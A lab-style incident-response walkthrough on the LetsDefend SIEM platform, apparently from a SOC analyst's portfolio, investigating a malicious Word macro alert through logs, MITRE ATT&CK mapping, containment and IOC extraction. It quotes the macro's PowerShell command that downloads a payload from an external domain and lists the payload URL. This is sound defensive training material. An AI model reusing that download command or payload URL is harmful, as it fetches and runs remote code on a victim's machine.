# 🕵️‍♂️ Project Walkthrough: Investigating a Malicious Macro Execution Using Let’s Defend SIEM

### 🎯 **Purpose of the Analysis**

This analysis simulates a real-world incident response scenario involving a **macro-based malware attack**. Using the **Let’s Defend SIEM platform**, I investigated a suspicious alert, traced the root cause, analyzed the malware’s behavior, and took appropriate containment steps — all aligned with industry best practices and the **MITRE ATT\&CK® Framework**.

The objective was to:

* **Validate the alert** and determine if it was a true positive
* **Understand the full scope of the threat**
* **Contain the threat and extract IOCs**
* **Document the investigation and suggest prevention strategies**

---

## 🚨 The Alert

| Attribute          | Details                                                            |
| ------------------ | ------------------------------------------------------------------ |
| **Event ID**       | 231                                                                |
| **Date/Time**      | Feb 28, 2024, 08:42 AM                                             |
| **Alert Rule**     | SOC205 - Malicious Macro has been executed                         |
| **Alert Level**    | Security Analyst                                                   |
| **Hostname**       | Jayne                                                              |
| **IP Address**     | 172.16.17.198                                                      |
| **File Name**      | `edit1-invoice.docm`                                               |
| **File Path**      | `C:\Users\LetsDefend\Downloads\edit1-invoice.docm`                 |
| **File Hash**      | `1a819d18c9a9de4f81829c4cd55a17f767443c22f9b30ca953866827e5d96fb0` |
| **Trigger Reason** | Suspicious file detected on the system                             |
| **EDR Action**     | Detected                                                           |

---

## 🧪 Initial Triage – What Triggered the Alert?

The alert was triggered by the execution of a macro-enabled Word document (`.docm`) — a common attack vector for malware.

To begin the analysis, I looked up the file hash on **VirusTotal**. It was flagged as malicious by **33 out of 66 vendors**, indicating strong suspicion. Upon re-analysis, I uncovered the following:

> **Behavior Summary:**
> The document contains a macro in `ThisDocument.cls`. When a UI component (`GBjdshuiKJ`) receives focus, it silently runs a hidden shell command extracted from `TextBox1` on `UserForm1`.

💡 **Implication:** Just clicking a field in this document could trigger malware — no user interaction beyond opening the file.

---

## 🛠️ Step 1: Check Containment Status (EDR Review)

From the playbook, the first action was to verify if the malware had already been quarantined.

<img width="1886" height="568" alt="not quarantined" src="https://github.com/user-attachments/assets/d52a8cdc-af12-4663-a2e4-ee1c2f686eeb" />

* Using the IP `172.16.17.198`, I searched the **EDR (Endpoint Detection & Response)** page.
* **Finding:** The device (`Jayne`) was **not contained**.
* The **terminal history was empty**, suggesting no recent command-line activity (which could be a sign of evasion or delay).

---

## 🧾 Step 2: Timeline of Malicious Activity (Log Review)

### ✅ 1. **Initial Download (08:41 AM)**

<img width="1451" height="269" alt="1" src="https://github.com/user-attachments/assets/602ae528-3c26-4987-b774-0a72ec6d0c32" />

* **Event ID:** 11 – File Created
* **File:** `edit1-invoice.docm.zip`
* **Source Process:** `C:\Windows\Explorer.exe`
* Likely origin: **phishing email or malicious link**

### ✅ 2. **PowerShell Execution (08:42 AM)**

<img width="1427" height="241" alt="2" src="https://github.com/user-attachments/assets/a589fe85-cab4-48e6-a2f4-52296e6f554e" />

* **Event ID:** 4104 – Remote Command Executed
* **Command:**

```powershell
(New-Object System.Net.WebClient).DownloadFile('http://www.greyhathacker...')
```

* **Process:** `powershell.exe`
* **Analysis:** Script downloads additional payload from a suspicious domain

### ✅ 3. **DNS Query**

<img width="1477" height="537" alt="5" src="https://github.com/user-attachments/assets/997e93f1-9233-4ed2-8cb6-bd4004e59402" />

* **Domain Queried:** `www.greyhathacker.net`
* **Resolved IP:** `92.204.221.16`
* Confirms network-level communication with external infrastructure

### ✅ 4. **Firewall & Proxy Logs**

<img width="1432" height="270" alt="3" src="https://github.com/user-attachments/assets/ce1e2a65-6ccf-438c-adbb-aef0c78aec97" />

* **Destination:** `92.204.221.16:80` (HTTP)
* **URL Requested:** `http://www.greyhathacker.net/tools/MESSBOX.EXE`
* **Result:** 404 (File Not Found)
* **Implication:** Payload delivery failed — likely due to a downed server, not a safe system

### ✅ 5. **Historical Behavior (Feb 27)**

* **Destination IP:** `52.85.96.93:443`
* Suspicious prior connection, potential **C2 or data exfiltration**

---

## 🧬 Step 3: Malware Analysis (VirusTotal + MITRE Mapping)

### 🔍 Confirmed Behavior:

This file demonstrates advanced behavior often seen in **bootkits**, **backdoors**, and **dropper-style macros**.

### 💡 MITRE ATT\&CK Mapping:

| Tactic                   | Technique                    | Behavior                                       |
| ------------------------ | ---------------------------- | ---------------------------------------------- |
| **Execution**            | T1064 – Scripting            | VBA macro runs hidden PowerShell               |
|                          | T1203 – Exploit Execution    | Triggered external process                     |
| **Persistence**          | T1542.003 – Bootkit          | Suspicious pre-boot manipulation attempts      |
|                          | T1574.002 – DLL Side-Loading | Attempts to load `wer.dll`, `vcruntime140.dll` |
| **Privilege Escalation** | T1055.011 – Memory Injection | Large private memory allocation                |
| **Defense Evasion**      | T1497 – VM Evasion           | Detected sandbox checks (e.g., QEMU, Hyper-V)  |
| **Discovery**            | T1082 – System Info          | Probes registry & language settings            |
|                          | T1518.001 – AV Discovery     | Detects security software                      |
| **Command & Control**    | T1071, T1573                 | HTTP/HTTPS comms (likely encrypted)            |
| **Impact**               | T1496 – Resource Hijack      | Potential cryptojacking behavior               |

---

## 🛰️ Step 4: Confirm C2 Communication

Next, I checked if the endpoint contacted any **C2 infrastructure** (Command & Control).

During log review, I identified suspicious outbound connections to **known malicious IPs**:  
- **52.85.96.93**, **35.186.224.25**, and **31.13.88.174** (historically linked to malware distribution).  
- These IPs were flagged by multiple engines for hosting:  
  - Malicious executables (`UR Browser Setup`, `26j64bdjd2.exe`, `nhjgawgl.exe`).  
  - Compromised ELF binaries (Linux malware) and fake installers (`SpotifyInstaller`).  

The endpoint’s traffic to these IPs suggests **potential C2 communication or payload retrieval**, aligning with the malware’s earlier behavior (e.g., PowerShell downloads, VM evasion).  


✅ **Conclusion:** This endpoint did indeed reach a known malicious IP — a major indicator of compromise.

---

## 🛡️ Step 5: Containment

Given the evidence, I immediately **contained the host** from the **EDR dashboard**.

> 🔒 **Why this matters:**
> Containment stops lateral movement, prevents further C2 communication, and isolates the threat — crucial when malware attempts to drop payloads or escalate privileges.

---

## 🧾 Step 6: IOC Extraction

### Indicators of Compromise:

| Type                   | Value                                                              |
| ---------------------- | ------------------------------------------------------------------ |
| **File Hash**          | `1a819d18c9a9de4f81829c4cd55a17f767443c22f9b30ca953866827e5d96fb0` |
| **Suspicious Domains** | `greyhathacker.net`                                                |
| **IP Addresses**       | `92.204.221.16`, `52.85.96.93`                                     |
| **Processes**          | `powershell.exe`, `DW20.EXE`                                       |
| **File**               | `edit1-invoice.docm`                                               |

---

## 🧾 Step 7: Analyst Comment Snippet

> *"Malicious macro executed hidden PowerShell commands to contact a suspicious external domain (`greyhathacker.net`) with intent to download a payload. Endpoint also communicated with previously flagged malicious IPs. The attack was halted before full execution, but indicators confirm malicious intent. Host was contained. Analysis closed as **True Positive**."*

---

## 🛡️ Recommendations

To prevent such attacks in future:

* **Block macro-enabled files** from email and downloads by default
* **Disable PowerShell for non-admin users**
* Enforce **network segmentation** and **DNS filtering**
* Regularly update **threat intel feeds** for domain/IP blacklisting
* Educate users on **phishing and attachment handling**

---

## 💭 Reflection: What I Learned

* How to **correlate logs across EDR, SIEM, DNS, and Proxy**
* How to map attack behavior to **MITRE ATT\&CK techniques**
* The importance of **early containment**
* Practical hands-on experience investigating **macro-based threats**

This simulation helped sharpen my skills in threat hunting, malware analysis, and incident response — all critical in a SOC environment.

---

## ✅ Conclusion

This project was a deep dive into investigating a macro-triggered malware attack using the Let’s Defend SIEM platform. From detection to containment, I followed a structured, analytical process aligned with real-world cybersecurity workflows.

🔍 **From a single alert to full forensic visibility** — this walkthrough shows how even a “simple” macro can be part of a sophisticated attack chain.
